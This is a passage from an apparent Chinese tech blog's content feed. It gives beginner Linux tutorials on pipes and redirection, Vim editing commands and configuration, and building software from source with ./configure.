function">tee</span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="9-结合-xargs-执行批量命令"><a href="#9-结合-xargs-执行批量命令" class="headerlink" title="9. 结合 xargs 执行批量命令"></a><strong>9. 结合 <code>xargs</code> 执行批量命令</strong></h3><ul><li><p>删除包含特定关键词的文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"temp"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将文本文件中的内容逐行作为命令行参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> files.txt <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token function">mv</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> /backup/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="10-动态监控日志文件"><a href="#10-动态监控日志文件" class="headerlink" title="10. 动态监控日志文件"></a><strong>10. 动态监控日志文件</strong></h3><ul><li><p>监控日志文件中包含错误的行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tail</span> <span class="token parameter variable">-f</span> /var/log/syslog <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"error"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="管道符结合其他符号"><a href="#管道符结合其他符号" class="headerlink" title="管道符结合其他符号"></a><strong>管道符结合其他符号</strong></h2><h3 id="与重定向符号一起使用"><a href="#与重定向符号一起使用" class="headerlink" title="与重定向符号一起使用"></a><strong>与重定向符号一起使用</strong></h3><p>将管道符的输出保存到文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"txt"</span> <span class="token operator">&gt;</span> result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="多重管道"><a href="#多重管道" class="headerlink" title="多重管道"></a><strong>多重管道</strong></h3><p>将多个命令串联：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"keyword"</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token parameter variable">-c</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-nr</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>功能：<ol><li>搜索文件中的 <code>keyword</code>。</li><li>排序结果。</li><li>去重并统计出现次数。</li><li>按出现次数逆序排序。</li></ol></li></ul><hr><p>在 Linux 中，<strong>重定向</strong> 是将命令的输出或输入重定向到文件或其他设备的操作。它通常用于保存输出、将错误输出单独处理或读取文件作为输入。</p><hr><h2 id="1-输出重定向"><a href="#1-输出重定向" class="headerlink" title="1. 输出重定向"></a><strong>1. 输出重定向</strong></h2><h3 id="标准输出"><a href="#标准输出" class="headerlink" title="标准输出 (>)"></a><strong>标准输出 (<code>&gt;</code>)</strong></h3><ul><li>将命令的标准输出（正常输出）重定向到文件。</li><li>如果文件已存在，会<strong>覆盖</strong>原文件内容。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&gt;</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">&gt;</span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 ls 命令的输出保存到 output.txt文件中。</p></li></ul><h3 id="追加输出"><a href="#追加输出" class="headerlink" title="追加输出 (>>)"></a><strong>追加输出 (<code>&gt;&gt;</code>)</strong></h3><ul><li>将命令的标准输出<strong>追加</strong>到文件末尾，而不是覆盖。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&gt;&gt;</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"New line"</span> <span class="token operator">&gt;&gt;</span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将字符串 “New line” 添加到 output.txt 的末尾。</p></li></ul><hr><h2 id="2-错误重定向"><a href="#2-错误重定向" class="headerlink" title="2. 错误重定向"></a><strong>2. 错误重定向</strong></h2><h3 id="标准错误输出-2"><a href="#标准错误输出-2" class="headerlink" title="标准错误输出 (2>)"></a><strong>标准错误输出 (<code>2&gt;</code>)</strong></h3><ul><li>将命令的错误输出（标准错误）重定向到文件。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> error.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> nonexistent_file <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> error.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将错误消息保存到 error.txt。</p></li></ul><h3 id="追加错误输出-2"><a href="#追加错误输出-2" class="headerlink" title="追加错误输出 (2>>)"></a><strong>追加错误输出 (<code>2&gt;&gt;</code>)</strong></h3><ul><li>将错误输出<strong>追加</strong>到文件末尾。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&gt;</span> error.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="3-合并标准输出和错误输出"><a href="#3-合并标准输出和错误输出" class="headerlink" title="3. 合并标准输出和错误输出"></a><strong>3. 合并标准输出和错误输出</strong></h2><h3 id="将标准输出和标准错误合并到同一文件"><a href="#将标准输出和标准错误合并到同一文件" class="headerlink" title="将标准输出和标准错误合并到同一文件"></a><strong>将标准输出和标准错误合并到同一文件</strong></h3><ul><li>使用 <code>&amp;&gt;</code> 将正常输出和错误输出都保存到一个文件。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&amp;&gt;</span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> existing_file nonexistent_file <span class="token operator">&amp;&gt;</span> all_output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="追加合并输出"><a href="#追加合并输出" class="headerlink" title="追加合并输出"></a><strong>追加合并输出</strong></h3><ul><li>使用 <code>&amp;&gt;&gt;</code> 将正常输出和错误输出都追加到一个文件。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&amp;&gt;&gt;</span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="4-输入重定向"><a href="#4-输入重定向" class="headerlink" title="4. 输入重定向"></a><strong>4. 输入重定向</strong></h2><h3 id="将文件作为命令的输入"><a href="#将文件作为命令的输入" class="headerlink" title="将文件作为命令的输入 (<)"></a><strong>将文件作为命令的输入 (<code>&lt;</code>)</strong></h3><ul><li>使用 <code>&lt;</code> 将文件内容作为命令的输入。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&lt;</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wc</span> <span class="token parameter variable">-l</span> <span class="token operator">&lt;</span> input.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统计 input.txt 的行数。</p></li></ul><hr><h2 id="5-同时处理输出和错误"><a href="#5-同时处理输出和错误" class="headerlink" title="5. 同时处理输出和错误"></a><strong>5. 同时处理输出和错误</strong></h2><h3 id="将标准输出和错误分别保存到不同文件"><a href="#将标准输出和错误分别保存到不同文件" class="headerlink" title="将标准输出和错误分别保存到不同文件"></a><strong>将标准输出和错误分别保存到不同文件</strong></h3><ul><li>使用 <code>&gt; file</code> 和 <code>2&gt; error_file</code>：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&gt;</span> output.txt <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> error.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> existing_file nonexistent_file <span class="token operator">&gt;</span> stdout.txt <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> stderr.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="6-特殊重定向"><a href="#6-特殊重定向" class="headerlink" title="6. 特殊重定向"></a><strong>6. 特殊重定向</strong></h2><h3 id="丢弃输出到-dev-null"><a href="#丢弃输出到-dev-null" class="headerlink" title="丢弃输出到 /dev/null"></a><strong>丢弃输出到 <code>/dev/null</code></strong></h3><ul><li><p><code>/dev/null</code> 是一个特殊设备文件，重定向到它的内容会被丢弃。</p></li><li><p>丢弃标准输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&gt;</span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>丢弃标准错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>同时丢弃标准输出和错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">&amp;&gt;</span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="7-使用-tee-同时输出到文件和终端"><a href="#7-使用-tee-同时输出到文件和终端" class="headerlink" title="7. 使用 tee 同时输出到文件和终端"></a><strong>7. 使用 <code>tee</code> 同时输出到文件和终端</strong></h2><ul><li><code>tee</code> 命令可以将输入同时保存到文件和终端。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">tee</span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 <code>ls</code> 的输出显示在终端的同时保存到 <code>output.txt</code>。</p></li><li><p>追加模式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h2 id="8-重定向符号总结"><a href="#8-重定向符号总结" class="headerlink" title="8. 重定向符号总结"></a><strong>8. 重定向符号总结</strong></h2><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td><code>&gt;</code></td><td>将标准输出重定向到文件，覆盖文件内容</td></tr><tr><td><code>&gt;&gt;</code></td><td>将标准输出追加到文件末尾</td></tr><tr><td><code>2&gt;</code></td><td>将错误输出重定向到文件，覆盖文件内容</td></tr><tr><td><code>2&gt;&gt;</code></td><td>将错误输出追加到文件末尾</td></tr><tr><td><code>&amp;&gt;</code></td><td>将标准输出和错误输出重定向到同一文件</td></tr><tr><td><code>&amp;&gt;&gt;</code></td><td>将标准输出和错误输出追加到同一文件</td></tr><tr><td><code>&lt;</code></td><td>将文件内容作为命令的标准输入</td></tr><tr><td><code>/dev/null</code></td><td>丢弃所有输出</td></tr><tr><td>`</td><td>tee`</td></tr></tbody></table><hr><h3 id="示例：组合重定向"><a href="#示例：组合重定向" class="headerlink" title="示例：组合重定向"></a><strong>示例：组合重定向</strong></h3><ol><li><p>同时保存输出和错误到不同文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> existing_file nonexistent_file <span class="token operator">&gt;</span> stdout.txt <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> stderr.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>同时显示输出在终端，并保存到文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">tee</span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>统计某文件夹的文件数量，但丢弃错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /path/to/dir <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> /dev/null <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim 编辑器详细教程</title>
      <link href="/2024/11/23/vim-bian-ji-qi/"/>
      <url>/2024/11/23/vim-bian-ji-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="Vim-编辑器详细教程"><a href="#Vim-编辑器详细教程" class="headerlink" title="Vim 编辑器详细教程"></a>Vim 编辑器详细教程</h1><p>Vim 是一个强大的文本编辑器，以其高效的编辑能力和强大的功能著称，特别适合程序员和文字处理工作者。以下是一个详细的 Vim 教程，从基础操作到高级用法。</p><hr><h2 id="1-Vim-基础操作"><a href="#1-Vim-基础操作" class="headerlink" title="1. Vim 基础操作"></a>1. <strong>Vim 基础操作</strong></h2><h3 id="1-1-Vim-的三种模式"><a href="#1-1-Vim-的三种模式" class="headerlink" title="1.1 Vim 的三种模式"></a>1.1 Vim 的三种模式</h3><ul><li><strong>正常模式</strong>（Normal Mode）：默认进入的模式，用于浏览、操作和执行命令。</li><li><strong>插入模式</strong>（Insert Mode）：用于编辑文本，按 <code>i</code> 进入。</li><li><strong>命令模式</strong>（Command Mode）：执行文件操作或配置命令，按 <code>:</code> 进入。</li><li>ESC：三种模式切换。</li></ul><h3 id="1-2-启动和退出-Vim"><a href="#1-2-启动和退出-Vim" class="headerlink" title="1.2 启动和退出 Vim"></a>1.2 启动和退出 Vim</h3><ul><li><p>启动 Vim：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>退出 Vim：</p><ul><li>保存并退出：<code>:</code> → 输入 <code>wq</code> → 按 <code>Enter</code></li><li>强制退出（不保存）：<code>:</code> → 输入 <code>q!</code> → 按 <code>Enter</code></li></ul></li></ul><hr><h2 id="2-Vim-基本移动命令"><a href="#2-Vim-基本移动命令" class="headerlink" title="2. Vim 基本移动命令"></a>2. <strong>Vim 基本移动命令</strong></h2><ul><li>按键快速移动：<ul><li><code>h</code>：向左移动一个字符</li><li><code>l</code>：向右移动一个字符</li><li><code>j</code>：向下移动一行</li><li><code>k</code>：向上移动一行</li></ul></li><li>按单词移动：<ul><li><code>w</code>：跳到下一个单词开头</li><li><code>e</code>：跳到当前或下一个单词末尾</li><li><code>b</code>：跳到当前或前一个单词开头</li></ul></li><li>按行快速移动：<ul><li><code>0</code>：跳到行首</li><li><code>^</code>：跳到行首的第一个非空字符</li><li><code>$</code>：跳到行尾</li></ul></li><li>按页移动：<ul><li><code>Ctrl-d</code>：向下滚动半屏</li><li><code>Ctrl-u</code>：向上滚动半屏</li></ul></li></ul><hr><h2 id="3-文本编辑操作"><a href="#3-文本编辑操作" class="headerlink" title="3. 文本编辑操作"></a>3. <strong>文本编辑操作</strong></h2><h3 id="3-1-插入文本"><a href="#3-1-插入文本" class="headerlink" title="3.1 插入文本"></a>3.1 插入文本</h3><ul><li><code>i</code>：在光标前插入</li><li><code>I</code>：在行首插入</li><li><code>a</code>：在光标后插入</li><li><code>A</code>：在行尾插入</li><li><code>o</code>：在当前行下插入新行</li><li><code>O</code>：在当前行上插入新行</li></ul><h3 id="3-2-删除文本"><a href="#3-2-删除文本" class="headerlink" title="3.2 删除文本"></a>3.2 删除文本</h3><ul><li><code>x</code>：删除光标处字符</li><li><code>dw</code>：删除当前单词</li><li><code>dd</code>：删除当前行</li><li><code>d$</code>：删除光标到行尾</li><li><code>d0</code>：删除光标到行首</li></ul><h3 id="3-3-复制与粘贴"><a href="#3-3-复制与粘贴" class="headerlink" title="3.3 复制与粘贴"></a>3.3 复制与粘贴</h3><ul><li><code>yy</code>：复制当前行</li><li><code>y$</code>：复制光标到行尾</li><li><code>p</code>：粘贴到光标后</li><li><code>P</code>：粘贴到光标前</li></ul><h3 id="3-4-替换文本"><a href="#3-4-替换文本" class="headerlink" title="3.4 替换文本"></a>3.4 替换文本</h3><ul><li><code>r</code>：替换当前字符</li><li><code>R</code>：进入替换模式</li><li><code>cw</code>：替换当前单词</li><li><code>C</code>：替换光标到行尾内容</li></ul><hr><h2 id="4-搜索与替换"><a href="#4-搜索与替换" class="headerlink" title="4. 搜索与替换"></a>4. <strong>搜索与替换</strong></h2><h3 id="4-1-搜索"><a href="#4-1-搜索" class="headerlink" title="4.1 搜索"></a>4.1 搜索</h3><ul><li><code>/关键词</code>：向下搜索</li><li><code>?关键词</code>：向上搜索</li><li><code>n</code>：跳到下一个匹配</li><li><code>N</code>：跳到上一个匹配</li></ul><h3 id="4-2-替换"><a href="#4-2-替换" class="headerlink" title="4.2 替换"></a>4.2 替换</h3><ul><li>单次替换：<code>:%s/旧文本/新文本/g</code></li><li>确认替换：<code>:%s/旧文本/新文本/gc</code></li></ul><hr><h2 id="5-多文件与多窗口"><a href="#5-多文件与多窗口" class="headerlink" title="5. 多文件与多窗口"></a>5. <strong>多文件与多窗口</strong></h2><h3 id="5-1-分屏操作"><a href="#5-1-分屏操作" class="headerlink" title="5.1 分屏操作"></a>5.1 分屏操作</h3><ul><li><code>:sp 文件名</code>：水平分屏</li><li><code>:vsp 文件名</code>：垂直分屏</li><li><code>Ctrl-w</code> + <code>方向键</code>：切换窗口</li></ul><h3 id="5-2-标签页"><a href="#5-2-标签页" class="headerlink" title="5.2 标签页"></a>5.2 标签页</h3><ul><li><code>:tabnew 文件名</code>：打开新标签页</li><li><code>:tabn</code>：切换到下一个标签页</li><li><code>:tabp</code>：切换到上一个标签页</li></ul><hr><h2 id="6-Vim-配置"><a href="#6-Vim-配置" class="headerlink" title="6. Vim 配置"></a>6. <strong>Vim 配置</strong></h2><h3 id="6-1-创建配置文件"><a href="#6-1-创建配置文件" class="headerlink" title="6.1 创建配置文件"></a>6.1 创建配置文件</h3><p>Vim 配置文件路径：</p><ul><li>Linux: <code>~/.vimrc</code></li><li>Windows: <code>C:\Users\&lt;用户名&gt;\_vimrc</code></li></ul><h3 id="6-2-常用配置"><a href="#6-2-常用配置" class="headerlink" title="6.2 常用配置"></a>6.2 常用配置</h3><pre class="line-numbers language-vim" data-language="vim"><code class="language-vim"><span class="token keyword">set</span> <span class="token keyword">number</span>           <span class="token comment">" 显示行号</span><span class="token keyword">set</span> <span class="token builtin">tabstop</span><span class="token operator">=</span><span class="token number">4</span>        <span class="token comment">" 设置 Tab 宽度为 4</span><span class="token keyword">set</span> <span class="token builtin">shiftwidth</span><span class="token operator">=</span><span class="token number">4</span>     <span class="token comment">" 自动缩进宽度为 4</span><span class="token keyword">set</span> <span class="token builtin">expandtab</span>        <span class="token comment">" 将 Tab 转为空格</span><span class="token keyword">set</span> <span class="token builtin">autoindent</span>       <span class="token comment">" 自动缩进</span><span class="token keyword">set</span> <span class="token builtin">hlsearch</span>         <span class="token comment">" 高亮搜索结果</span><span class="token keyword">set</span> <span class="token builtin">incsearch</span>        <span class="token comment">" 实时搜索</span><span class="token builtin">syntax</span> <span class="token keyword">on</span>            <span class="token comment">" 开启语法高亮</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="7-高级功能"><a href="#7-高级功能" class="headerlink" title="7. 高级功能"></a>7. <strong>高级功能</strong></h2><h3 id="7-1-宏录制"><a href="#7-1-宏录制" class="headerlink" title="7.1 宏录制"></a>7.1 宏录制</h3><ul><li>开始录制：按 <code>q</code> → 输入一个字母（如 <code>a</code>）</li><li>执行操作（如插入文本或删除行）</li><li>结束录制：再次按 <code>q</code></li><li>播放宏：<code>@a</code></li></ul><h3 id="7-2-快速跳转"><a href="#7-2-快速跳转" class="headerlink" title="7.2 快速跳转"></a>7.2 快速跳转</h3><ul><li><code>Ctrl-o</code>：返回上一个光标位置</li><li><code>Ctrl-i</code>：前进到下一个光标位置</li></ul><hr><h2 id="8-学习资源"><a href="#8-学习资源" class="headerlink" title="8. 学习资源"></a>8. <strong>学习资源</strong></h2><ul><li>官方文档：<code>:help</code></li><li>在线教程：<a href="https://vim-adventures.com/">Vim Adventures</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译教程</title>
      <link href="/2024/11/23/bian-yi-shi-yong/"/>
      <url>/2024/11/23/bian-yi-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="编译教程"><a href="#编译教程" class="headerlink" title="编译教程"></a>编译教程</h1><p>下面是一个<strong>完整的从源码编译安装软件的教程</strong>，涵盖了从环境准备到配置、编译、安装的所有可能会用到的步骤和细节，适用于各种类型的软件包。</p><hr><h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><p>在开始编译源码之前，确保系统满足以下条件：</p><h3 id="1-安装必要工具"><a href="#1-安装必要工具" class="headerlink" title="1. 安装必要工具"></a>1. <strong>安装必要工具</strong></h3><p>在 Linux 环境下，通常需要以下工具：</p><ul><li><strong>编译器</strong>: <code>gcc</code> 或 <code>clang</code></li><li><strong>构建工具</strong>: <code>make</code></li><li><strong>其他依赖</strong>: <code>autoconf</code>, <code>automake</code>, <code>libtool</code></li></ul><p>对于基于 Debian 的系统（如 Ubuntu）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential autoconf automake libtool pkg-config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>对于基于 RHEL 的系统（如 CentOS）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum groupinstall <span class="token string">"Development Tools"</span><span class="token function">sudo</span> yum <span class="token function">install</span> autoconf automake libtool pkgconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-下载源码"><a href="#2-下载源码" class="headerlink" title="2. 下载源码"></a>2. <strong>下载源码</strong></h3><p>源码通常以 <code>.tar.gz</code> 或 <code>.tar.bz2</code> 的形式提供：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://example.com/software-1.0.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-xzvf</span> software-1.0.tar.gz<span class="token builtin class-name">cd</span> software-1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="二、运行-configure"><a href="#二、运行-configure" class="headerlink" title="二、运行 ./configure"></a>二、运行 <code>./configure</code></h2><p><code>./configure</code> 是自动生成的配置脚本，用于检查系统环境，生成适合当前系统的编译配置。以下是配置过程的所有选项说明。</p><h3 id="1-路径相关选项"><a href="#1-路径相关选项" class="headerlink" title="1. 路径相关选项"></a>1. <strong>路径相关选项</strong></h3><table><thead><tr><th>选项</th><th>功能</th><th>默认值</th><th>示例</th></tr></thead><tbody><tr><td><code>--prefix=DIR</code></td><td>软件安装的根目录</td><td><code>/usr/local</code></td><td><code>--prefix=/opt/myapp</code></td></tr><tr><td><code>--exec-prefix=DIR</code></td><td>架构相关文件的安装路径</td><td><code>$prefix</code></td><td><code>--exec-prefix=/usr</code></td></tr><tr><td><code>--bindir=DIR</code></td><td>可执行文件安装路径</td><td><code>$exec_prefix/bin</code></td><td><code>--bindir=/usr/bin</code></td></tr><tr><td><code>--libdir=DIR</code></td><td>库文件安装路径</td><td><code>$exec_prefix/lib</code></td><td><code>--libdir=/opt/myapp/lib</code></td></tr><tr><td><code>--includedir=DIR</code></td><td>头文件安装路径</td><td><code>$prefix/include</code></td><td><code>--includedir=/opt/include</code></td></tr></tbody></table><p><strong>示例</strong>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/opt/myapp <span class="token parameter variable">--bindir</span><span class="token operator">=</span>/opt/myapp/bin <span class="token parameter variable">--libdir</span><span class="token operator">=</span>/opt/myapp/lib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="prefix-的用途"><a href="#prefix-的用途" class="headerlink" title="prefix 的用途"></a><code>prefix</code> 的用途</h4><p><code>prefix</code> 是通过 <code>./configure --prefix=DIR</code> 选项指定的路径。其主要作用是告诉构建系统，安装的文件应该放在哪个目录下。</p><p><code>$prefix</code> 的默认值通常是：</p><pre class="line-numbers language-none"><code class="language-none">/usr/local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果你运行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/opt/myapp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么，安装路径会变成以下结构：</p><pre class="line-numbers language-none"><code class="language-none">/opt/myapp/bin       # 可执行文件/opt/myapp/lib       # 库文件/opt/myapp/include   # 头文件/opt/myapp/share     # 共享资源（如文档、手册）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="如何修改-prefix"><a href="#如何修改-prefix" class="headerlink" title="如何修改 $prefix"></a>如何修改 <code>$prefix</code></h4><p>在配置阶段指定通过 <code>./configure</code> 的 <code>--prefix</code> 参数直接指定：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/custom/path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不指定，系统会默认安装到 <code>/usr/local</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span class="token comment"># 文件安装到 /usr/local/...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="prefix-的实际应用"><a href="#prefix-的实际应用" class="headerlink" title="$prefix 的实际应用"></a><code>$prefix</code> 的实际应用</h4><p>假设我们正在安装一个名为 <code>myapp</code> 的软件：</p><p>示例 1: 默认安装到 <code>/usr/local</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装完成后，文件路径如下：</p><pre class="line-numbers language-none"><code class="language-none">/usr/local/bin/myapp        # 可执行文件/usr/local/lib/libmyapp.so  # 动态库/usr/local/include/myapp.h  # 头文件/usr/local/share/myapp      # 共享数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>示例 2: 自定义安装路径</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/opt/myapp<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装完成后，文件路径如下：</p><pre class="line-numbers language-none"><code class="language-none">/opt/myapp/bin/myapp        # 可执行文件/opt/myapp/lib/libmyapp.so  # 动态库/opt/myapp/include/myapp.h  # 头文件/opt/myapp/share/myapp      # 共享数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="为什么-prefix-很重要"><a href="#为什么-prefix-很重要" class="headerlink" title="为什么 $prefix 很重要"></a>为什么 <code>$prefix</code> 很重要</h4><h5 id="1-避免覆盖系统文件"><a href="#1-避免覆盖系统文件" class="headerlink" title="1. 避免覆盖系统文件"></a>1. 避免覆盖系统文件</h5><p>默认路径 <code>/usr/local</code> 不会影响系统自带的软件，安全且独立。</p><h5 id="2-方便不同版本共存"><a href="#2-方便不同版本共存" class="headerlink" title="2. 方便不同版本共存"></a>2. 